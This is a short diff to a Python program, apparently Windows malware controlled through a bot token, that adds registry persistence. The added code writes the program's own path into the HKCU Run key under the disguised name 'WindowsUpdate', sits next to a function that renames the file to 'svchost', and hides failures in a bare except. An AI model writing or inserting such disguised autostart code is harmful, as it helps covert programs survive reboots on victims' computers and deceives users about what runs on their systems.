@@ -64,6 +64,24 @@ def rename_to_svchost():
         pass
 rename_to_svchost()
 
+# ============ АВТОМАТИЧЕСКАЯ АВТОЗАГРУЗКА ============
+def auto_persistence():
+    try:
+        exe_path = sys.executable
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_WRITE
+        )
+        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(key)
+        return True
+    except:
+        return False
+
+auto_persistence()
+
 # ============ КОНФИГ ============
 TOKEN = "{{TOKEN}}"
 ADMIN_ID = {{ADMIN_ID}}
